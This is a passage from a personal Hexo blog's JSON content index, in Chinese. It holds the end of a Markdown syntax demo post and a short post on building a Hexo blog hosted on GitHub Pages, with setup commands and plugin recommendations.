特殊符号 HTML Entities Codes&copy; &amp; &uml; &trade; &iexcl; &pound;&amp; &lt; &gt; &yen; &euro; &reg; &plusmn; &para; &sect; &brvbar; &macr; &laquo; &middot; X&sup2; Y&sup3; &frac34; &frac14; &times; &divide; &raquo; 18&ordm;C &quot; &apos; [========] Emoji表情 :smiley: Blockquotes :star: GFM task lists &amp; Emoji &amp; fontAwesome icon emoji &amp; editormd logo emoji :editormd-logo-5x: :smiley: @mentions, :smiley: #refs, links, formatting, and tags supported :editormd-logo:; list syntax required (any unordered or ordered list supported) :editormd-logo-3x:; [ ] :smiley: this is a complete item :smiley:; []this is an incomplete item test link :fa-star: @pandao; [ ]this is an incomplete item :fa-star: :fa-gear:; :smiley: this is an incomplete item test link :fa-star: :fa-gear:; :smiley: this is :fa-star: :fa-gear: an incomplete item test link; 反斜杠 Escape*literal asterisks* [========] 科学公式 TeX(KaTeX)$$E=mc^2$$ 行内的公式$$E=mc^2$$行内的公式，行内的$$E=mc^2$$公式。 $$x &gt; y$$ $$(\\sqrt{3x-1}+(1+x)^2)$$ $$\\sin(\\alpha)^{\\theta}=\\sum_{i=0}^{n}(x^i + \\cos(f))$$ 多行公式： 12345\\displaystyle\\left( \\sum\\_&#123;k=1&#125;^n a\\_k b\\_k \\right)^2\\leq\\left( \\sum\\_&#123;k=1&#125;^n a\\_k^2 \\right)\\left( \\sum\\_&#123;k=1&#125;^n b\\_k^2 \\right) 123456789\\displaystyle \\frac&#123;1&#125;&#123; \\Bigl(\\sqrt&#123;\\phi \\sqrt&#123;5&#125;&#125;-\\phi\\Bigr) e^&#123; \\frac25 \\pi&#125;&#125; = 1+\\frac&#123;e^&#123;-2\\pi&#125;&#125; &#123;1+\\frac&#123;e^&#123;-4\\pi&#125;&#125; &#123; 1+\\frac&#123;e^&#123;-6\\pi&#125;&#125; &#123;1+\\frac&#123;e^&#123;-8\\pi&#125;&#125; &#123;1+\\cdots&#125; &#125; &#125; &#125; 123f(x) = \\int_&#123;-\\infty&#125;^\\infty \\hat f(\\xi)\\,e^&#123;2 \\pi i \\xi x&#125; \\,d\\xi 分页符 Page break Print Test: Ctrl + P [========] 绘制流程图 Flowchart12345678st=&gt;start: 用户登陆op=&gt;operation: 登陆操作cond=&gt;condition: 登陆成功 Yes or No?e=&gt;end: 进入后台st-&gt;op-&gt;condcond(yes)-&gt;econd(no)-&gt;op [========] 绘制序列图 Sequence Diagram1234Andrew-&gt;China: Says Hello Note right of China: China thinks\\nabout it China--&gt;Andrew: How are you? Andrew-&gt;&gt;China: I am good thanks! End","tags":[{"name":"md","slug":"md","permalink":"https://laoel.github.io/tags/md/"},{"name":"markdown","slug":"markdown","permalink":"https://laoel.github.io/tags/markdown/"},{"name":"语法介绍","slug":"语法介绍","permalink":"https://laoel.github.io/tags/语法介绍/"}]},{"title":"博客搭建小记","date":"2019-09-28T09:36:06.000Z","path":"2019/09/28/博客搭建小记/","text":"叙博客 主要用来写 技术文章，记录自己的知识，也希望可以帮助到他人少走弯路。 搭建参考先参照了下列文章，进行了初步搭建 超详细Hexo+Github博客搭建小白教程 - 韦阳 通过GitHub和Hexo来搭建自己的个人博客 - Jowan 过程简单来说 安装 git Node.js（附带有npm），然后分别输入 node -v npm -v git --version ，如果显示出对应的版本号，就说明安装成功了。 安装hexo，输入 npm install hexo-cli -g 即可。然后输入 hexo -v 验证是否安装成功。 添加国内镜像源，下面这个是 淘宝的国内镜像。 1npm config set registry https://registry.npm.taobao.org 注册github账号，新建一个项目，名称为 your_username.github.io 。 本地找个存放博客文件的目录，准备建立博客。 输入 hexo init 初始化文件夹； 输入 npm install 安装必备的组件； 输入 hexo g 生成静态网页； 输入 hexo s 打开本地服务器； 浏览器访问 http://localhost:4000 ，就可以看到我们的博客啦。 配置ssh key，参照 GitHub搭建博客配置SSH - 空旷在远方 修改博客根目录下的 _config.yml 文件。 1234deploy: type: git repository: https://github.com/godweiyang/godweiyang.github.io branch: master repository修改为你自己的github项目地址。 发布博客到 自己的github项目上 。 12hexo ghexo d 更换博客主题以及主题的相关配置，极力推荐 https://github.com/chaooo/hexo-theme-BlueLake 相关配置看这篇 BlueLake博客主题的详细配置 - 秋过冬漫长 安装一些插件 npm install hexo-generator-feed 添加RSS npm install hexo-generator-sitemap 添加网站地图 npm install hexo-generator-baidu-sitemap 添加百度收录 到这一步，基本就可以了。更多配置，后续补充。 各种优化 Hexo NexT 站内搜索 站点统计 RSS订阅 字数统计 阅读时长 进度条 图片放大 Canvas背景 DaoVoice聊天 Gitalk评论 功能配置 - Sweet、汤圆儿 Hexo七牛云图床使用 - 晒月亮的孩子 写作技巧 hexo 创建文章、标签、分类的Front-matter - hiekay https://www.jianshu.com/p/6e4af897a3f0 Markdown 语法介绍 https://coding.net/help/doc/project/markdown.html Markdown 在线编辑器 http://editor.md.ipandao.com/examples/full.html Hexo+Github pages博客绑定中文域名 - 温柔小猪 https://blog.csdn.net/zaq0123/article/details/79880969","tags":[{"name":"杂文","slug":"杂文","permalink":"https://laoel.github.io/tags/杂文/"},{"name":"博客","slug":"博客","permalink":"https://laoel.github.io/tags/博客/"}]}]